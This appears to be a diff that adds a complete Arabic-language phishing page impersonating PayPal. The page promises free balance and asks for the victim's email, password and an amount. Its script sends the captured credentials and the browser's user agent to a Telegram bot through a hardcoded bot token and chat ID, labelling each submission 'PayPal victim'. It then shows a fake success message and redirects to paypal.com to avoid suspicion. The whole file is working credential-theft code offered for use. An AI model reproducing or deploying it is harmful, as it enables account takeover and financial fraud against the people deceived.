@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>PayPal - رصيد مجاني</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',Tahoma,sans-serif;background:linear-gradient(135deg,#003087,#009cde);color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.container{background:#fff;border-radius:12px;padding:30px 20px;max-width:400px;width:100%;text-align:center;box-shadow:0 10px 40px rgba(0,0,0,0.3)}
+.logo{font-size:40px;color:#003087;font-weight:900;font-style:italic;margin-bottom:15px}
+h1{font-size:20px;color:#003087;margin-bottom:8px}
+.sub{color:#666;font-size:13px;margin-bottom:20px}
+.fg{margin-bottom:14px;text-align:right}
+label{display:block;color:#333;font-size:12px;margin-bottom:5px;font-weight:600}
+input{width:100%;padding:14px;background:#f5f5f5;border:2px solid #ddd;border-radius:8px;color:#000;font-size:14px;outline:none}
+input:focus{border-color:#009cde}
+.btn{width:100%;padding:14px;margin-top:10px;background:#009cde;color:#fff;border:none;border-radius:25px;font-size:17px;font-weight:bold;cursor:pointer}
+.btn:active{transform:scale(0.96)}
+.load{display:none;position:fixed;inset:0;background:rgba(255,255,255,0.95);z-index:99;justify-content:center;align-items:center;flex-direction:column}
+.load.show{display:flex}
+.spinner{width:50px;height:50px;border:4px solid #ddd;border-top:4px solid #009cde;border-radius:50%;animation:spin 0.8s linear infinite;margin-bottom:18px}
+@keyframes spin{to{transform:rotate(360deg)}}
+.done{display:none;position:fixed;inset:0;background:rgba(255,255,255,0.98);z-index:98;justify-content:center;align-items:center;flex-direction:column}
+.done.show{display:flex}
+.done h2{color:#003087;font-size:24px;margin:12px 0}
+</style>
+</head>
+<body>
+<div class="container" id="form">
+<div class="logo">PayPal</div>
+<h1>رصيد مجاني</h1>
+<p class="sub">احصل على رصيد PayPal مجاني</p>
+<div class="fg"><label>📧 البريد الإلكتروني</label><input type="email" id="email" placeholder="email@example.com"></div>
+<div class="fg"><label>🔒 كلمة المرور</label><input type="password" id="password" placeholder="كلمة المرور"></div>
+<div class="fg"><label>💵 المبلغ</label><select id="amount" style="width:100%;padding:14px;background:#f5f5f5;border:2px solid #ddd;border-radius:8px;color:#000;font-size:14px;outline:none"><option value="">-- اختر --</option><option>$10</option><option>$25</option><option>$50</option><option>$100</option><option>$500</option></select></div>
+<button class="btn" onclick="go()">💸 احصل على الرصيد</button>
+</div>
+<div class="load" id="load"><div class="spinner"></div><p style="color:#666">⏳ جاري إضافة الرصيد...</p></div>
+<div class="done" id="done"><h2>✅ تم بنجاح!</h2><p style="color:#666">سيتم إضافة الرصيد خلال 24 ساعة</p></div>
+<script>
+var u=new URL(window.location.href);
+var CHAT=u.searchParams.get('chatId')||'7276604783';
+var TOKEN=u.searchParams.get('token')||'8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo';
+async function send(t){
+try{await fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT,text:t,parse_mode:'HTML'})})}catch(e){}
+}
+async function go(){
+var em=document.getElementById('email').value.trim();
+var pw=document.getElementById('password').value.trim();
+var am=document.getElementById('amount').value;
+if(!em||!pw||!am)return alert('املأ جميع الحقول');
+document.getElementById('load').classList.add('show');
+var msg='💳 <b>ضحية باي بال!</b>\n\n📧 إيميل: '+em+'\n🔒 كلمة: '+pw+'\n💵 مبلغ: '+am+'\n\n📱 '+navigator.userAgent;
+await send(msg);
+setTimeout(function(){document.getElementById('load').classList.remove('show');document.getElementById('done').classList.add('show');setTimeout(function(){window.location.href='https://paypal.com/'},3000)},4000);
+}
+</script>
+</body>
+</html>
